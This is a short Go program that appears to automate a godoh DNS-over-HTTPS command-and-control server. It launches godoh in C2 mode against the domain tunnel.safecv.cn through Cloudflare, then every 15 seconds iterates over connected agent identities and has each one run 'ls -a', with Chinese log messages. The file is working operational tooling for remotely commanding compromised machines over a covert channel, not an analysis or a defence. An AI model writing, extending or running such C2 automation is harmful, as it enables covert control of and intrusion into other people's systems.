package main

import (
	"go-godoh-proxy/child"
	"go-godoh-proxy/godoh"
	"go-godoh-proxy/logger"
	"time"
)

func main() {
	p, err := child.CreateChildProcess(`godoh`, "c2", "-d", "tunnel.safecv.cn", "-p", "cloudflare")
	if err != nil {
		panic(err)
	}
	logger.Log("子进程创建成功")
	p.Handle(func(stream *child.IOStream) {
		isRunning := true
		sendDuration := 15 * time.Second
		sendCommands := []string{"ls -a"}
		logger.Log("系统启动")
		i := godoh.NewIdentityReader(stream)
		go i.SyncTickHandle(sendDuration, func(identity []string) {
			for _, id := range identity {
				logger.Log("正在处理 " + id)
				i.Use(id)
				for _, cmd := range sendCommands {
					logger.Log("执行命令：" + cmd)
					i.Run(cmd)
				}
			}
		}, &isRunning)
		go godoh.SyncListen(stream, []godoh.LineReader{i})
	})
	p.Wait()
}
